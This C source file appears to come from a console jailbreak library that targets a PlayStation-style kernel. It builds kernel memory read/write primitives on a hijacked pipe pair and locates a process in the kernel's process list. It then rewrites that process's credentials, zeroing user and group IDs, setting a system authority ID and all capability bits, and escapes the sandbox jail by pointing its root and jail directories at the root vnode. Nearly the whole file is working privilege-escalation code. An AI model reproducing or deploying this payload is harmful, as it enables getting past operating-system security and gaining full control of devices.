#include "oops/escalate.h"
#include "oops/offsets.h"
#include "oops/system.h"

/* Platform symbols from libkernel */
__attribute__((weak)) int sceKernelGetProcessId(void);
__attribute__((weak)) int sceKernelReadProcessMemory(int pid, const void *addr, void *buf, size_t size);
__attribute__((weak)) int sceKernelWriteProcessMemory(int pid, void *addr, const void *buf, size_t size);
__attribute__((weak)) int write(int fd, const void *buf, size_t count);
__attribute__((weak)) long read(int fd, void *buf, size_t count);

/* Pipe primitives state */
static int s_rwpipe[2] = { -1, -1 };
static int s_rwpair[2] = { -1, -1 };
static uint64_t s_kpipe_addr = 0;
static uint64_t s_kdata_base = 0;
static bool s_pipe_initialized = false;
static bool s_rw_initialized = false;

int oops_kernel_pipe_init(int rwpipe[2], int rwpair[2], uint64_t kpipe_addr, uint64_t kdata_base) {
    if (!rwpipe || !rwpair || kpipe_addr == 0) return -1;
    s_rwpipe[0] = rwpipe[0];
    s_rwpipe[1] = rwpipe[1];
    s_rwpair[0] = rwpair[0];
    s_rwpair[1] = rwpair[1];
    s_kpipe_addr = kpipe_addr;
    s_kdata_base = kdata_base;
    s_pipe_initialized = true;
    s_rw_initialized = true;
    return 0;
}

int oops_kernel_rw_init(void) {
    if (s_rw_initialized) {
        return 0;
    }
    if (s_pipe_initialized) {
        s_rw_initialized = true;
        return 0;
    }
    if (sceKernelReadProcessMemory && sceKernelWriteProcessMemory && sceKernelGetProcessId) {
        s_rw_initialized = true;
        return 0;
    }
    return -1;
}

int oops_kernel_copyout(uint64_t kaddr, void *buf, size_t size) {
    if (!buf || size == 0) return -1;
    if (!s_rw_initialized) {
        if (oops_kernel_rw_init() != 0) {
            return -1;
        }
    }

    if (s_pipe_initialized && write && read) {
        /* Write target address into kpipe_addr buffer pointer via rwpair */
        if (write(s_rwpair[1], &kaddr, sizeof(kaddr)) != (int)sizeof(kaddr)) {
            return -1;
        }
        /* Read from rwpipe directly pulls from kaddr */
        if (read(s_rwpipe[0], buf, size) != (long)size) {
            return -1;
        }
        return 0;
    }

    if (sceKernelReadProcessMemory) {
        return sceKernelReadProcessMemory(-1, (const void *)(uintptr_t)kaddr, buf, size);
    }

    return -1;
}

int oops_kernel_copyin(const void *buf, uint64_t kaddr, size_t size) {
    if (!buf || size == 0) return -1;
    if (!s_rw_initialized) {
        if (oops_kernel_rw_init() != 0) {
            return -1;
        }
    }

    if (s_pipe_initialized && write) {
        if (write(s_rwpair[1], &kaddr, sizeof(kaddr)) != (int)sizeof(kaddr)) {
            return -1;
        }
        if (write(s_rwpipe[1], buf, size) != (int)size) {
            return -1;
        }
        return 0;
    }

    if (sceKernelWriteProcessMemory) {
        return sceKernelWriteProcessMemory(-1, (void *)(uintptr_t)kaddr, buf, size);
    }

    return -1;
}

static uint64_t read_k_u64(uint64_t kaddr) {
    uint64_t val = 0;
    if (oops_kernel_copyout(kaddr, &val, sizeof(val)) == 0) {
        return val;
    }
    return 0;
}

static uint32_t read_k_u32(uint64_t kaddr) {
    uint32_t val = 0;
    if (oops_kernel_copyout(kaddr, &val, sizeof(val)) == 0) {
        return val;
    }
    return 0;
}

uint64_t oops_kernel_find_proc_by_pid(int pid) {
    if (!s_rw_initialized) {
        if (oops_kernel_rw_init() != 0) {
            return 0;
        }
    }

    const oops_common_offsets_t *common = oops_offsets_get_common();
    if (!common) return 0;

    /* Determine active firmware */
    oops_system_info_t sysinfo;
    const oops_fw_offsets_t *fw = NULL;
    if (oops_system_get_info(&sysinfo) == 0) {
        fw = oops_offsets_get_fw(sysinfo.firmware_raw);
        if (!fw && sysinfo.firmware_str[0] != '\0') {
            fw = oops_offsets_get_fw_str(sysinfo.firmware_str);
        }
    }

    uint64_t kbase = s_kdata_base;
    uint64_t allproc_off = 0;

    if (fw) {
        if (kbase == 0) kbase = fw->kdata_base;
        allproc_off = fw->allproc;
    }

    if (kbase == 0 || allproc_off == 0) {
        return 0;
    }

    uint64_t allproc_addr = (allproc_off < 0x80000000ULL) ? (kbase + allproc_off) : allproc_off;
    uint64_t proc = read_k_u64(allproc_addr);

    int safety = 0;
    while (proc != 0 && safety < 4096) {
        uint32_t p_pid = read_k_u32(proc + common->p_pid);
        if ((int)p_pid == pid) {
            return proc;
        }
        /* p_list.le_next is at offset 0 */
        proc = read_k_u64(proc);
        safety++;
    }

    return 0;
}

uint64_t oops_kernel_get_current_proc(void) {
    if (!sceKernelGetProcessId) {
        return 0;
    }
    int pid = sceKernelGetProcessId();
    if (pid < 0) return 0;
    return oops_kernel_find_proc_by_pid(pid);
}

int oops_jailbreak_process(int pid) {
    if (pid <= 0) {
        if (sceKernelGetProcessId) {
            pid = sceKernelGetProcessId();
        } else {
            return -1;
        }
    }

    uint64_t proc = oops_kernel_find_proc_by_pid(pid);
    if (!proc) return -1;

    const oops_common_offsets_t *common = oops_offsets_get_common();
    if (!common) return -1;

    uint64_t ucred = read_k_u64(proc + common->p_ucred);
    uint64_t fd = read_k_u64(proc + common->p_fd);
    if (!ucred || !fd) return -1;

    /* 1. Clear uid, ruid, svuid, ngroups, rgid */
    uint32_t zero = 0;
    (void)oops_kernel_copyin(&zero, ucred + common->cr_uid, sizeof(zero));
    (void)oops_kernel_copyin(&zero, ucred + common->cr_ruid, sizeof(zero));
    (void)oops_kernel_copyin(&zero, ucred + common->cr_svuid, sizeof(zero));
    (void)oops_kernel_copyin(&zero, ucred + common->cr_ngroups, sizeof(zero));
    (void)oops_kernel_copyin(&zero, ucred + common->cr_rgid, sizeof(zero));
    (void)oops_kernel_copyin(&zero, ucred + common->cr_svgid, sizeof(zero));

    /* 2. Set SYSTEM_AUTHID */
    uint64_t authid = OOPS_SYSTEM_AUTHID;
    (void)oops_kernel_copyin(&authid, ucred + common->cr_sceauthid, sizeof(authid));

    /* 3. Set capabilities (all-ones) */
    uint64_t all_ones = 0xFFFFFFFFFFFFFFFFULL;
    (void)oops_kernel_copyin(&all_ones, ucred + common->cr_scecaps, sizeof(all_ones));
    (void)oops_kernel_copyin(&all_ones, ucred + common->cr_scecaps + 8, sizeof(all_ones));

    /* 4. Set attribute byte */
    uint8_t attr0 = 0x80;
    (void)oops_kernel_copyin(&attr0, ucred + common->cr_sceattr0, sizeof(attr0));

    /* 5. Escape jail: resolve rootvnode and point fd_rdir/fd_jdir */
    oops_system_info_t sysinfo;
    const oops_fw_offsets_t *fw = NULL;
    if (oops_system_get_info(&sysinfo) == 0) {
        fw = oops_offsets_get_fw(sysinfo.firmware_raw);
        if (!fw && sysinfo.firmware_str[0] != '\0') {
            fw = oops_offsets_get_fw_str(sysinfo.firmware_str);
        }
    }

    if (fw && fw->rootvnode != 0) {
        uint64_t kbase = (s_kdata_base != 0) ? s_kdata_base : fw->kdata_base;
        uint64_t rootvnode_addr = (fw->rootvnode < 0x80000000ULL) ? (kbase + fw->rootvnode) : fw->rootvnode;
        uint64_t rootvnode_ptr = read_k_u64(rootvnode_addr);
        if (rootvnode_ptr != 0) {
            (void)oops_kernel_copyin(&rootvnode_ptr, fd + common->fd_rdir, sizeof(rootvnode_ptr));
            (void)oops_kernel_copyin(&rootvnode_ptr, fd + common->fd_jdir, sizeof(rootvnode_ptr));
        }
    }

    return 0;
}

int oops_escape_jail(void) {
    if (!sceKernelGetProcessId) return -1;
    return oops_jailbreak_process(sceKernelGetProcessId());
}

int oops_escalate_to_system_authid(void) {
    uint64_t proc = oops_kernel_get_current_proc();
    if (!proc) return -1;

    const oops_common_offsets_t *common = oops_offsets_get_common();
    if (!common) return -1;

    uint64_t ucred = read_k_u64(proc + common->p_ucred);
    if (!ucred) return -1;

    uint64_t system_authid = OOPS_SYSTEM_AUTHID;
    return oops_kernel_copyin(&system_authid, ucred + common->cr_sceauthid, sizeof(system_authid));
}

int oops_has_system_authid(void) {
    uint64_t proc = oops_kernel_get_current_proc();
    if (!proc) return -1;

    const oops_common_offsets_t *common = oops_offsets_get_common();
    if (!common) return -1;

    uint64_t ucred = read_k_u64(proc + common->p_ucred);
    if (!ucred) return -1;

    uint64_t authid = 0;
    if (oops_kernel_copyout(ucred + common->cr_sceauthid, &authid, sizeof(authid)) != 0) {
        return -1;
    }

    return (authid == OOPS_SYSTEM_AUTHID) ? 1 : 0;
}
